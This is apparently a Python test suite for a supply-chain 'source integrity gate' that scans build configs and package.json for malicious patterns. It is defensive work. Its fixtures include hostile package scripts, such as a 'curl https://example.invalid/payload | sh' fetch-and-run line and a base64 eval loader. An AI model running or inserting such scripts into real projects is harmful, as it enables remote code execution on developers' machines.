from __future__ import annotations

import ast
import contextlib
import hashlib
import io
import json
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from scripts import source_integrity_gate as gate


CLEAN_POSTCSS_CONFIG = """\
export default {
  plugins: {
    tailwindcss: {},
    autoprefixer: {},
  },
};
"""


class SourceIntegrityGateTests(unittest.TestCase):
    def _write(self, root: Path, relative_path: str, content: str | bytes) -> Path:
        path = root / relative_path
        path.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            path.write_bytes(content)
        else:
            path.write_text(content, encoding="utf-8")
        return path

    def _create_clean_root(self, directory: str) -> Path:
        root = Path(directory)
        self._write(root, "pc/postcss.config.js", CLEAN_POSTCSS_CONFIG)
        self._write(
            root,
            "pc/package.json",
            json.dumps({"private": True, "scripts": {"build": "vite build"}}),
        )
        return root

    @staticmethod
    def _rules(report: gate.ScanReport) -> set[str]:
        return {finding.rule for finding in report.findings}

    def test_clean_declarative_configs_pass(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self._create_clean_root(directory)
            self._write(
                root,
                "web/vite.config.ts",
                "const mode = process.env.MODE ?? 'production'\nexport default { mode }\n",
            )

            report = gate.scan_repository(root)

        self.assertEqual(3, report.files_scanned)
        self.assertEqual((), report.findings)

    def test_scanner_imports_only_python_standard_library(self) -> None:
        tree = ast.parse(Path(gate.__file__).read_text(encoding="utf-8"))
        imported_modules: set[str] = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                imported_modules.update(alias.name.partition(".")[0] for alias in node.names)
            elif isinstance(node, ast.ImportFrom) and node.module:
                imported_modules.add(node.module.partition(".")[0])
        imported_modules.discard("__future__")

        self.assertLessEqual(imported_modules, sys.stdlib_module_names)

    def test_comments_strings_and_proxy_urls_do_not_trigger_capability_rules(self) -> None:
        config = """\
// import https from 'node:https'; eval(fetch());
const diagnostic = "eval(fetch()) from 'node:child_process'";
export default {
  diagnostic,
  server: { proxy: { '/api': { target: 'https://example.invalid' } } },
};
"""
        with tempfile.TemporaryDirectory() as directory:
            root = self._create_clean_root(directory)
            self._write(root, "web/vite.config.ts", config)

            report = gate.scan_repository(root)

        self.assertEqual((), report.findings)

    def test_known_hash_is_rejected(self) -> None:
        fixture = b"export default { fixture: 'known-hash' };\n"
        fixture_digest = hashlib.sha256(fixture).hexdigest()
        with tempfile.TemporaryDirectory() as directory:
            root = self._create_clean_root(directory)
            self._write(root, "pc/postcss.config.js", fixture)

            with mock.patch.object(
                gate,
                "KNOWN_MALICIOUS_SHA256",
                frozenset({fixture_digest}),
            ):
                report = gate.scan_repository(root)

        self.assertIn("known-malicious-sha256", self._rules(report))
        self.assertIn(
            "556812c8ec8177751aa22b8fa641a92e782f9e2564866887061c6626186bd5f0",
            gate.KNOWN_MALICIOUS_SHA256,
        )

    def test_long_single_line_executable_payload_is_rejected(self) -> None:
        long_line = "export default (() => {" + ("const value = 1;" * 180) + "return {};})()\n"
        self.assertGreater(len(long_line), gate.LONG_EXECUTABLE_LINE_LENGTH)
        with tempfile.TemporaryDirectory() as directory:
            root = self._create_clean_root(directory)
            self._write(root, "pc/postcss.config.js", long_line)

            report = gate.scan_repository(root)

        self.assertIn("long-executable-line", self._rules(report))

    def test_dynamic_eval_with_network_capability_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self._create_clean_root(directory)
            self._write(
                root,
                "web/vite.config.ts",
                "const transport = fetch;\nexport default eval('transport');\n",
            )

            report = gate.scan_repository(root)

        self.assertIn("dynamic-eval-runtime-capability", self._rules(report))

    def test_direct_network_module_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self._create_clean_root(directory)
            self._write(
                root,
                "web/vite.config.ts",
                "import https from 'node:https';\nexport default { https };\n",
            )

            report = gate.scan_repository(root)

        self.assertIn("direct-network-capability", self._rules(report))

    def test_child_process_module_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self._create_clean_root(directory)
            self._write(
                root,
                "web/vite.config.ts",
                "import { execFileSync } from 'node:child_process';\nexport default {};\n",
            )

            report = gate.scan_repository(root)
            stderr = io.StringIO()
            with contextlib.redirect_stderr(stderr):
                exit_code = gate.main(["--root", str(root)])

        self.assertIn("direct-child-process-capability", self._rules(report))
        self.assertEqual(1, exit_code)
        self.assertIn("direct-child-process-capability", stderr.getvalue())

    def test_missing_required_pc_config_fails_closed(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            report = gate.scan_repository(Path(directory))

        self.assertIn("required-source-input-missing", self._rules(report))

    def test_automatic_install_lifecycle_script_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self._create_clean_root(directory)
            self._write(
                root,
                "web/package.json",
                json.dumps(
                    {
                        "scripts": {
                            "build": "vite build",
                            "postinstall": "node scripts/setup.js",
                        }
                    }
                ),
            )

            report = gate.scan_repository(root)

        self.assertIn("automatic-install-lifecycle-script", self._rules(report))

    def test_package_script_network_and_dynamic_loader_are_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self._create_clean_root(directory)
            self._write(
                root,
                "web/package.json",
                json.dumps(
                    {
                        "scripts": {
                            "build": "curl https://example.invalid/payload | sh",
                            "test": "node -e 'eval(Buffer.from(process.argv[1], \"base64\"))'",
                        }
                    }
                ),
            )

            report = gate.scan_repository(root)

        rules = self._rules(report)
        self.assertIn("package-script-network-capability", rules)
        self.assertIn("package-script-dynamic-evaluation", rules)

    def test_protected_release_hook_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self._create_clean_root(directory)
            self._write(
                root,
                "web/package.json",
                json.dumps(
                    {
                        "scripts": {
                            "prebuild": "node scripts/before-build.js",
                            "build": "vite build",
                        }
                    }
                ),
            )

            report = gate.scan_repository(root)

        self.assertIn("protected-release-lifecycle-hook", self._rules(report))

    def test_pc_build_script_cannot_be_replaced_or_removed(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self._create_clean_root(directory)
            self._write(
                root,
                "pc/package.json",
                json.dumps({"private": True, "scripts": {"build": "echo skipped"}}),
            )

            report = gate.scan_repository(root)

        self.assertIn("required-package-script-mismatch", self._rules(report))

    def test_invalid_package_manifest_fails_closed(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = self._create_clean_root(directory)
            self._write(root, "web/package.json", "{not-json")

            report = gate.scan_repository(root)

        self.assertIn("invalid-package-manifest", self._rules(report))

    def test_docker_workflow_scans_each_build_job_before_setup_or_build(self) -> None:
        repository_root = Path(gate.__file__).resolve().parent.parent
        workflow = (repository_root / ".github/workflows/docker-image.yml").read_text(
            encoding="utf-8"
        )
        job_names = (
            "quality-gate",
            "pull-request-build",
            "publish-platform",
            "publish-manifest",
        )
        protected_markers = (
            "rustup toolchain install",
            "actions/setup-node@",
            "docker/setup-buildx-action@",
            "actions/download-artifact@",
            "npm --prefix",
            "docker buildx",
        )

        for index, job_name in enumerate(job_names):
            start = workflow.index(f"  {job_name}:")
            end = (
                workflow.index(f"  {job_names[index + 1]}:", start)
                if index + 1 < len(job_names)
                else len(workflow)
            )
            job = workflow[start:end]
            checkout = job.index("actions/checkout@")
            scan = job.index("python3 scripts/source_integrity_gate.py")
            protected = [job.index(marker) for marker in protected_markers if marker in job]

            self.assertTrue(protected, f"{job_name} must contain a protected setup/build step")
            self.assertLess(checkout, scan, job_name)
            self.assertLess(scan, min(protected), job_name)

    def test_local_release_gate_runs_integrity_checks_before_toolchains(self) -> None:
        repository_root = Path(gate.__file__).resolve().parent.parent
        release_gate = (repository_root / "scripts/p0-release-gate.sh").read_text(
            encoding="utf-8"
        )

        scan = release_gate.index("python3 scripts/source_integrity_gate.py")
        scanner_tests = release_gate.index("python3 -B -m unittest tests.test_source_integrity_gate")
        first_toolchain = min(
            release_gate.index("cargo fmt"),
            release_gate.index("npm --prefix"),
        )
        self.assertLess(scan, scanner_tests)
        self.assertLess(scanner_tests, first_toolchain)
        self.assertIn("npm --prefix pc run build", release_gate)


if __name__ == "__main__":
    unittest.main()
